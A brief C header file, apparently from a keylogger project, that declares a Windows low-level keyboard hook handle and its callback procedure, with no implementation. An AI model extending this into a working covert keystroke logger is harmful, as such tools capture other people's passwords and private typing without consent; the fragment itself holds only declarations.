#ifndef KEYLOG_H_INCLUDED
#define KEYLOG_H_INCLUDED

extern HHOOK kbdhook;

LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wp, LPARAM lp);

#endif // KEYLOG_H_INCLUDED
